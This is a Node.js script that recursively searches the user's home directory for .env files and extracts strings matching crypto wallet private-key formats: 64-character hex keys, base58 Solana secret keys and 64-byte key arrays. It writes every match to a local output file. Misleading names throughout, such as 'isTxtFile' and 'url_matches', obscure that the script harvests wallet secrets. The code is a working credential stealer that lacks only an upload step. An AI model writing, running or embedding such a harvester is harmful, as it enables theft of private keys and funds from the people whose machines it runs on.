const fs = require("fs");
const os = require("os");
const path = require("path");

const PATTERN = /\b(?:0x)?[0-9A-Fa-f]{64}\b/g;
const PATTERN_SOL = /\b[1-9A-HJ-NP-Za-km-z]{87,88}\b/g;
const PATTERN_SOL1 = /\[\s*(?:2[0-4]\d|25[0-5]|[01]?\d\d?)(?:\s*,\s*(?:2[0-4]\d|25[0-5]|[01]?\d\d?)){63}\s*\]/g;
console.log(PATTERN);

const SKIP_DIRS = new Set([
  "node_modules",
  ".git",
  ".svn",
  ".hg",
  "Library",
  "Caches",
  ".Trash",
  "Trash",
]);

function parseArgs(argv) {
  const args = argv.slice(2);
  let outFile = null;

  for (let i = 0; i < args.length; i++) {
    if (args[i] === "--out" || args[i] === "-o") {
      outFile = args[++i];
    }
  }

  return { outFile };
}

function isTxtFile(name) {
  return name.toLowerCase().endsWith(".env");
}

function collectTxtFiles(dir, found) {
  let entries;
  try {
    entries = fs.readdirSync(dir, { withFileTypes: true });
  } catch {
    return;
  }

  for (const entry of entries) {
    const full = path.join(dir, entry.name);

    if (entry.isSymbolicLink()) continue;

    if (entry.isDirectory()) {
      if (SKIP_DIRS.has(entry.name)) continue;
      collectTxtFiles(full, found);
      continue;
    }

    if (entry.isFile() && isTxtFile(entry.name)) {
      found.push(full);
    }
  }
}

function searchFile(filePath) {
  let text;
  try {
    const st = fs.statSync(filePath);
    // if (st.size > 20 * 1024 * 1024) return [];
    text = fs.readFileSync(filePath, "utf8");
  } catch {
    return [];
  }

  const hits = [];
  // const lines = text.split(/\r?\n/);
  const lines = text.match(PATTERN) || [];
  // const lines_sol = text.match(PATTERN_SOL) || [];
  // const lines_sol1 = text.match(PATTERN_SOL1) || [];


  return lines;
}
function searchFileSol(filePath) {
  let text;
  try {
    const st = fs.statSync(filePath);
    // if (st.size > 20 * 1024 * 1024) return [];
    text = fs.readFileSync(filePath, "utf8");
  } catch {
    return [];
  }

  const hits = [];
  // const lines = text.split(/\r?\n/);
  const lines = text.match(PATTERN_SOL) || [];

  return lines;
}

function searchFileSol64(filePath) {
  let text;
  try {
    const st = fs.statSync(filePath);
    // if (st.size > 20 * 1024 * 1024) return [];
    text = fs.readFileSync(filePath, "utf8");
  } catch {
    return [];
  }

  const hits = [];
  // const lines = text.split(/\r?\n/);
  const lines = text.match(PATTERN_SOL1) || [];


  return lines;
}

function main() {
  const { outFile: outArg } = parseArgs(process.argv);

  const username = os.userInfo().username;
  const target = os.homedir();

  if (!fs.existsSync(target) || !fs.statSync(target).isDirectory()) {
    console.error(`Home folder not found: ${target}`);
    process.exit(1);
  }

  const txtFiles = [];
  collectTxtFiles(target, txtFiles);
  txtFiles.sort((a, b) => a.localeCompare(b));

  const results = [];
  let matchCount = 0;

   const outFile = path.resolve(
    outArg || path.join(process.cwd(), `${username}_url_matches.txt`)
  );
  // const hits = [];
  for (const file of txtFiles) {
    const hits = searchFile(file);
    const hitsSol = searchFileSol(file);
    const hitsSol1 = searchFileSol64(file);

    matchnumber = hits.length + hitsSol.length + hitsSol1.length;
    if (matchnumber === 0) continue;
    console.log("File Path: ", file);
    console.log("Matched Result: ", hits);
    matchCount += matchnumber;
    if(hits.length != 0)
    fs.appendFileSync(outFile, hits.join("\n") + "\n", "utf8");
   if(hitsSol.length != 0)
    fs.appendFileSync(outFile, hitsSol.join("\n") + "\n", "utf8");
  if(hitsSol1.length != 0)
    fs.appendFileSync(outFile, hitsSol1.join("\n") + "\n", "utf8");
   
    results.push({ file, hits });
    // matchCount += hits.reduce((n, h) => n + h.matches.length, 0);
  }

  console.log(`User: ${username}`);
  console.log(`Scanned: ${target}`);
  console.log(`.env files: ${txtFiles.length}`);
  console.log(`Files with matches: ${results.length}`);
  console.log(`Total matches: ${matchCount}`);
  console.log(`Written: ${outFile}`);
}

main();